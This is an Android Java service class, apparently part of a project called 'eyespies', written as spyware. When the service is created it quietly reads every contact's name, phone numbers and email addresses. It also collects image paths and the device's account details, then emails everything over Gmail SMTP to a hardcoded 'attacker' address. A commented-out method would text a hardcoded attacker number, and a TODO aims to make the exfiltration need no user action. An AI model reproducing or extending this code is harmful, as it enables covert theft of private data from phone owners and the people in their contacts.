package com.eyespies.service;

import java.util.ArrayList;
import java.util.List;

import javax.mail.MessagingException;
import javax.mail.internet.AddressException;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;

public class SecurityBreachService extends Service {
	private static final String TAG = "SecurityBreachService";
	private static final String attackerEmailId = "eyespies55@gmail.com";
	private static final String attackerMobile = "1111111111";
	
	@Override
	public IBinder onBind(Intent arg0) {
		System.out.println("Binding.. !!");
		return null;
	}

	@Override
	public void onCreate() {
		Log.i(TAG, "Service created");
		//sendSMS();
		sendEmail();
	}

	public void sendSMS() {
		SmsManager sms = SmsManager.getDefault();
		sms.sendTextMessage(attackerMobile, null, 
				"Client has been attacked..Details sent to email" , null, null);
	}
	
	@Override
	public void onStart(Intent intent, int startid) {
		System.out.println("On start overridden");
	}

	public int sendEmail() {
		ContentResolver resolver = getContentResolver();
		Cursor cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI,
				null, null, null, null);
		if (cursor.getCount() > 0) {
			try{
				List<ContactInformation> contacts = fetchAllContacts(resolver, cursor);
				
				cursor.close();
				sendMailToAddress(contacts);
				return 1;
			}catch(Exception e){
				System.out.println("exception" );
				e.printStackTrace();
			}
		}
		return 0;
	}

	public List<ContactInformation> fetchAllContacts(ContentResolver resolver,Cursor cursor) {
		List<ContactInformation> contacts = new ArrayList<ContactInformation>();
		while (cursor.moveToNext()) {
			String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID)); 
			if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {

				Cursor contactCursor = resolver.query(
						ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
						null, 
						ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?", 
						new String[]{id}, null);

				while(contactCursor.moveToNext()){
					String contactNumber =  contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
					contactNumber = contactNumber.replaceAll("-", "");
					if(!contactNumber.equals(attackerMobile)) {
						String contactName = contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
						String contactEmailIds = fetchContactEmailIds(resolver, id);
						contacts.add(new ContactInformation(contactName, contactNumber, contactEmailIds));
					}
				}	
				contactCursor.close();
			}
		}
		return contacts;
	}

	public String fetchContactEmailIds(ContentResolver cr, String id) {
		String contactEmailIds = "";
		Cursor emailCursor = cr.query(
				ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
				ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
				new String[] { id }, null);

		while (emailCursor.moveToNext()) {
			String email = emailCursor
					.getString(emailCursor
							.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
			contactEmailIds += (email + ", ");
		}
		emailCursor.close();
		return contactEmailIds;
	}

	//TODO: Current version requires User's intervention, Send email without having to do so
	private void sendMailToAddress(List<ContactInformation> contacts) {
		String emailMessage = constructEmailMessage(contacts);
	    List<String> imageList= new ArrayList<String>();
	    Context context = getApplicationContext();
	    imageList=	ImageLister.getAllImages(context);
	    List<String> listOfAccounts = VictimAccountDetails.getAccount(context);
		try {
			new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "eyespies55@gmail.com", emailMessage, imageList,listOfAccounts);
		} catch (AddressException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (MessagingException e) {
			// TODO Auto-generated catch block
			System.out.println("messaging exception" + e.getMessage());
			e.printStackTrace();
		}
//		Intent intent = new Intent(Intent.ACTION_SENDTO); // it's not ACTION_SEND
//		intent.setType("text/plain");
//		intent.putExtra(Intent.EXTRA_SUBJECT, "Malicious gain of information");
//		intent.putExtra(Intent.EXTRA_TEXT, emailMessage);
//		intent.setData(Uri.parse("mailto:" + attackerEmailId)); // or just "mailto:" for blank
//		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // this will make such that when user returns to your app, your app is displayed, instead of the email app.
//		startActivity(intent); 
	}

	private String constructEmailMessage(List<ContactInformation> contacts) {
		StringBuffer message = new StringBuffer();
		for (ContactInformation contactInformation : contacts) {
			message.append(contactInformation.getInfo());
		}
		return message.toString();
	}
}